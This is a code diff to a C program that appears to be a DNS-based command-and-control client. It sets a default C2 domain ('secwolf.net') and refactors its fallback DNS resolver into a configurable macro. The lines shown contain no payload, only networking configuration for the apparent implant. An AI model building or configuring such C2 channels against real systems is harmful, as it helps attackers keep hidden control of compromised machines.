@@ -69,8 +69,11 @@
 // Configuration - these should match your server setup
 // DNS_SERVER macro removed - now uses get_system_dns() which reads
 // system resolver configuration (/etc/resolv.conf on Linux)
-// Falls back to 8.8.8.8 only when system resolver unavailable
+// Falls back to FALLBACK_DNS only when system resolver unavailable
 #define DNS_PORT 53
+#ifndef FALLBACK_DNS
+    #define FALLBACK_DNS "8.8.8.8"
+#endif
 #ifndef C2_DOMAINS
     #define C2_DOMAINS "secwolf.net"  // Comma-separated domains, default if not set by build system
 #endif
@@ -683,7 +686,7 @@ static int get_system_dns(char *dns_server, size_t dns_server_size) {
     // On Windows, reading registry is complex and platform-dependent
     // Most Windows systems can resolve through localhost or use DHCP DNS
     // Fallback to public DNS if system resolver unavailable
-    strncpy(dns_server, "8.8.8.8", dns_server_size - 1);
+    strncpy(dns_server, FALLBACK_DNS, dns_server_size - 1);
     dns_server[dns_server_size - 1] = '\0';
     return 0;
 #else
@@ -691,7 +694,7 @@ static int get_system_dns(char *dns_server, size_t dns_server_size) {
     FILE *resolv = fopen("/etc/resolv.conf", "r");
     if (!resolv) {
         // System resolver unavailable - use public DNS fallback
-        strncpy(dns_server, "8.8.8.8", dns_server_size - 1);
+        strncpy(dns_server, FALLBACK_DNS, dns_server_size - 1);
         dns_server[dns_server_size - 1] = '\0';
         return 0;
     }
@@ -719,7 +722,7 @@ static int get_system_dns(char *dns_server, size_t dns_server_size) {
     fclose(resolv);
     
     // No nameserver found in resolv.conf - use public DNS fallback
-    strncpy(dns_server, "8.8.8.8", dns_server_size - 1);
+    strncpy(dns_server, FALLBACK_DNS, dns_server_size - 1);
     dns_server[dns_server_size - 1] = '\0';
     return 0;
 #endif
